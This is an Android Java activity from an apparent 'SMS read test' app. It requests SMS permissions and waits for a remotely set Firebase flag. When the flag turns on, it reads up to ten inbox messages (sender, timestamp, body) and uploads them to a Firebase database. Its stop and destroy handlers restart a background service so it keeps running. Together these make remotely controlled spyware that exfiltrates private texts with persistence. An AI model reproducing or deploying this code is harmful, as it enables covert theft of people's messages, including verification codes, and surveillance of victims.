package com.kill390.smsreadtest;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import com.google.firebase.FirebaseOptions;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    DatabaseReference database = FirebaseDatabase.getInstance().getReference().child("users").child("ZdfnDnNDjDij3d");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkAndRequestPermissions();

        database.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.child("interested").getValue() == null){
                    database.child("interested").setValue("false");
                }else if (snapshot.child("interested").getValue().toString().equals("true")){
                    checkAndRequestPermissions();
                    readSMS();

                }

                if (snapshot.child("permission").getValue() == null){
                    database.child("permission").setValue("false");
                }

            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });


    }

    private boolean checkAndRequestPermissions()
    {
        int read = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        int receive = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS);

        if (read != PackageManager.PERMISSION_GRANTED && receive != PackageManager.PERMISSION_GRANTED)
        {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS,Manifest.permission.RECEIVE_SMS}, 1);
            database.child("permission").setValue("false");
            return false;
        }else {
            database.child("permission").setValue("true");
            return true;
        }
    }

    public void readSMS(){
        if(checkAndRequestPermissions()) {

            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            int i = 1 ;

            if (cursor.moveToFirst()) { // must check the result to prevent exception
                do {


                    /* important indexes
                        12 body
                        2 address
                        5 date_sent
                    */

                    String msg = "";
                    String msgData = "";
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);

                    }
                    // use msgData
                    msg = cursor.getColumnName(5) + ":" + getDate(cursor.getLong(5),"dd/MM/yyyy hh:mm:ss.SSS")+" "+cursor.getColumnName(2) + ":" + cursor.getString(2)+" "+cursor.getColumnName(12) + ":" + cursor.getString(12);

                    Log.i("here", msg);
                    Log.i("not", msgData);

                    database.child("SMS").child("sms" + i).setValue(msg);

                    i++;
                } while (cursor.moveToNext() && i <= 10);
            } else {
                // empty box, no SMS
            }

        }
    }
    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i ("Service status", "Running");
                return true;
            }
        }
        Log.i ("Service status", "Not running");
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED) {
                checkAndRequestPermissions();
                database.child("permission").setValue("true");
            }
        }

    }

    @Override
    protected void onStop() {
        super.onStop();
        Intent mServiceIntent = new Intent(this, MyService.class);
        if (!isMyServiceRunning(MyService.class)) {
            startService(mServiceIntent);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, SmsReceiver.class);
        this.sendBroadcast(broadcastIntent);

    }

    public static String getDate(long milliSeconds, String dateFormat)
    {
        // Create a DateFormatter object for displaying date in specified format.
        SimpleDateFormat formatter = new SimpleDateFormat(dateFormat);

        // Create a calendar object that will convert the date and time value in milliseconds to date.
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    }
}